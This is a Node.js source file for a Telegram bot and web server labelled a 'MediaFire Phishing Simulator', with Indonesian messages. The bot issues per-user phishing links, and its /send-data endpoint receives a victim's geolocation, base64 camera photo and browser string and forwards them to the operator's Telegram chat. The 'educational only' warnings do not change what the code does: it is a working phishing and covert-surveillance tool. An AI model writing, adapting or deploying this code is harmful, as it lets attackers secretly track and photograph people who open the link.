const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const bodyParser = require('body-parser');
const crypto = require('crypto');
require('dotenv').config();

const token = process.env.TELEGRAM_BOT_TOKEN;
const bot = new TelegramBot(token, {polling: true});
const app = express();
const PORT = process.env.PORT || 3000;

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

const SECRET_KEY = process.env.SECRET_KEY;
const PHISHING_URL = process.env.PHISHING_URL;

function generateToken(chatId) {
  const hmac = crypto.createHmac('sha256', SECRET_KEY);
  hmac.update(chatId.toString());
  return hmac.digest('hex').slice(0, 12);
}

bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(
    chatId,
    `🔒 MediaFire Phishing Simulator\n\nGunakan perintah /generate untuk membuat link phishing edukasi.`,
    {parse_mode: 'Markdown'}
  );
});

bot.onText(/\/generate/, (msg) => {
  const chatId = msg.chat.id;
  const token = generateToken(chatId);
  const uniqueUrl = `${PHISHING_URL}/?chat_id=${chatId}&token=${token}`;
  
  bot.sendMessage(
    chatId,
    `🔗 Phishing Link Created\n\n` +
    `Berikut link untuk edukasi keamanan digital:\n` +
    `${uniqueUrl}\n\n` +
    `PERINGATAN: Ini hanya untuk tujuan edukasi. Jangan disalahgunakan!`,
    {parse_mode: 'Markdown'}
  );
});

app.post('/send-data', async (req, res) => {
  try {
    const { chatId, token, location, photo, userAgent } = req.body;
    
    const expectedToken = generateToken(chatId);
    if (token !== expectedToken) {
      return res.status(403).json({ success: false, message: 'Invalid token' });
    }

    await bot.sendLocation(chatId, location.latitude, location.longitude);
    
    const message = `📱 Data Edukasi Phishing\n` +
                   `📍 Lokasi: ${location.latitude}, ${location.longitude}\n` +
                   `🌐 Browser: ${userAgent.substring(0, 50)}...\n` +
                   `📸 Foto: ${photo ? 'Tersedia' : 'Tidak tersedia'}`;
    
    await bot.sendMessage(chatId, message, {parse_mode: 'Markdown'});
    
    if (photo) {
      try {
        const base64Data = photo.replace(/^data:image\/jpeg;base64,/, "");
        const buffer = Buffer.from(base64Data, 'base64');
        await bot.sendPhoto(chatId, buffer);
      } catch (photoError) {
        await bot.sendMessage(chatId, '⚠️ Gagal mengirim foto');
      }
    }

    res.json({ success: true });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

app.get('/', (req, res) => {
  res.send('Phishing Simulator API Running');
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
  console.log("Bot Telegram started...");
});